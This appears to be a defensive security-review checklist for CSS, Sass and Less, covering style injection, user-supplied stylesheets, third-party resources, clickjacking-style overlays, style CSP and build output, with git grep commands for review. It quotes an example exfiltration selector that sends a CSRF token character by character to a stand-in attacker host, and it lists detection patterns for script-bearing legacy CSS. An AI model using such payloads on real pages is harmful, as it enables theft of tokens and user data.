# CSS security review

The security scope for CSS, Sass/SCSS and Less, and for code that builds styles from data. It
is read for the security pass of a full review, and on its own, with `WISDOM.md`, when the
review runs with `-s`/`--security`. Rate findings with `../SEVERITY.md` and report them with
`../REPORT_TEMPLATE.md`.

## Scope

In scope: untrusted values that reach a stylesheet or a `style` attribute, stylesheets
supplied by users, resources that CSS loads from other origins, styles that hide or imitate
security-relevant interface, the style part of the Content Security Policy, and what build
output reveals.

Establish first:

- **Whether any style is built from data.** A static stylesheet written by the team has a
  small attack surface: third-party resources and misleading interface. Styles built from
  request data, user settings or tenant themes are an injection surface.
- **Who controls each interpolated value,** including values stored by another user or
  another tenant.
- **Which pages the styles apply to.** Injection on a page with a CSRF token, a one-time
  code or personal data in the DOM is far more serious than on a public page.

## Where untrusted data enters

- Theme and branding settings: colours, fonts, background image URLs, custom CSS fields.
- Values interpolated into `style` attributes, `<style>` blocks or CSS-in-JS templates:
  widths, colours, positions and URLs from requests, profiles or a content system.
- Class names assembled from input.
- User-supplied stylesheets, HTML with `style` attributes (rich text, HTML email), SVG.
- Stylesheets, fonts and images fetched from another origin at run time.

## Checks

### Injection into styles

- **A value from input placed in a `<style>` block, a `style` attribute or a CSS-in-JS
  template without validation.** Injected CSS cannot run script in current browsers, but it
  can:
  - **read data out of the page:** attribute selectors matched against a value
    (`input[name="csrf"][value^="a"] { background: url(https://attacker/a) }`) leak it
    one character at a time; `@font-face` with `unicode-range` leaks which characters
    appear in text;
  - **rewrite the interface:** cover the page, move or relabel a button, hide a warning,
    show attacker text through `content`;
  - **call out:** any `url()` makes a request that carries the user's address and, to the
    same site, their cookies.
- **Validation by removing characters.** Validate against what the value is meant to be: a
  colour by a strict pattern, a length by number and unit, a URL by scheme and host
  allow-list. Rejecting `<` or `;` is not enough: `}` closes the rule, `url(` and `@import`
  need neither.
- **A value in a `<style>` block can also end it:** `</style>` in the value returns the
  parser to HTML, which makes this cross-site scripting. HTML escaping inside a `<style>`
  block does not help, because the block's content is not decoded.
- **Class names built from input** that can select a privileged or misleading style
  (`class="btn {{ kind }}"` with `kind` set to `admin hidden`).
- **Prefer setting individual properties through the DOM**
  (`element.style.setProperty('--accent', value)`, `element.style.width = …`) to building
  style text. A custom property set that way is confined to one declaration; check where it
  is consumed, since a value used in `url(var(--x))` or `content` still matters.

### User-supplied stylesheets and markup

- **A "custom CSS" feature whose output is shown to anyone but its author.** Treat it as
  the injection above, at scale. It needs a real CSS sanitiser with a property and value
  allow-list, `url()` and `@import` restricted or removed, selectors scoped to the user's
  own container, and no application of it on pages that hold secrets.
- **Sanitisers for user HTML that allow the `style` attribute or `<style>` element**
  without filtering their content.
- **Legacy script-bearing CSS in content for old clients** (HTML email, embedded
  webviews): `expression()`, `behavior:`, `-moz-binding`, `javascript:` in `url()`. Current
  browsers ignore them; old clients may not.

### Resources loaded from other origins

- **`@import` or `<link>` to a stylesheet on a host the project does not control.** Whoever
  controls that host controls the page's appearance and can run the exfiltration above. Add
  `integrity` to the `<link>` (CSS `@import` has no such mechanism), or self-host.
- **Fonts and images from third parties:** each request discloses the visitor's address and
  the referring page; an outage blocks or degrades rendering. Self-hosting is usually
  possible.
- **`url()` with `http://`** on an HTTPS page (mixed content), or protocol-relative URLs.
- **A new host in `url()` or `@import`** that the Content Security Policy must then allow.

### Interface that misleads

- **Styles that cover, hide or disable security-relevant interface:** consent text made
  invisible or tiny, a warning hidden behind an overlay, a destructive action styled as
  the safe default, `pointer-events: none` on a cancel control.
- **Overlays and transparent frames** (`opacity: 0`, high `z-index`, absolute
  positioning over a framed page) are the mechanism of clickjacking. In the application's
  own code they usually indicate a different problem; in user-influenced styles they are
  the attack.
- **Content that exists only in CSS** (`content:` text for a price, a warning or a
  required-field marker) is not reliably copied, translated or announced.
- **Visually reordered content** (`order`, `flex-direction: row-reverse`, absolute
  positioning) whose reading and focus order no longer matches what a user confirms.

### Policy and build output

- **`style-src 'unsafe-inline'` added or relied on.** Inline `style` attributes and
  `<style>` blocks need it; moving styles to files, or using nonces or hashes, lets the
  policy block injected styles.
- **Source maps and unminified sources published** with internal paths, comments or
  unreleased feature names.
- **Comments in shipped CSS** that name internal systems, people or tickets.
- **Preprocessor functions that read the file system or run code at build time** (custom
  Sass functions and importers, Less plugins and JavaScript evaluation): a build-time
  concern when the input is not trusted.

## Tools

| Purpose | Command | Notes |
| --- | --- | --- |
| Styles built from data in templates | `git grep -nE 'style="[^"]*(\{\{\|<%\|\$\{)\|<style[^>]*>[^<]*(\{\{\|<%)' -- '*.html' '*.jinja' '*.erb' '*.ejs' '*.vue' '*.hbs'` | A rough net: read each hit and trace the value. |
| Styles built from data in script | `git grep -nE 'cssText\|insertRule\|setAttribute\(.style.\|createGlobalStyle\|innerHTML *=.*<style\|\.style *= *\`' -- '*.js' '*.jsx' '*.ts' '*.tsx' '*.vue'` | Also read CSS-in-JS templates that interpolate props. |
| Resources from other origins | `git grep -nE '@import +(url\()?.?(https?:)?//\|url\(.?(https?:)?//' -- '*.css' '*.scss' '*.less'` | List the hosts; ask whether each is needed and pinned. |
| Legacy script-bearing CSS | `git grep -niE 'expression\(\|behavior *:\|-moz-binding\|javascript:' -- '*.css' '*.scss' '*.less' '*.html'` | |
| Style policy | `git grep -nE "style-src\|unsafe-inline"` | Then `curl -sI` against a local instance to see what is sent. |
| Published source maps | `git grep -n 'sourceMappingURL'`, and check the build configuration | |
| Lint | `npx stylelint "src/**/*.{css,scss,less}"` | Finds no security defects by default; it confirms the files parse. |

## What this review does not establish

It reads stylesheets and the code that builds styles. It does not test a running site, so
it cannot confirm the deployed policy, which pages a stylesheet reaches, or that an injection
is exploitable in a given browser. Mark such findings `to verify` and recommend a dynamic
test where the change warrants it.
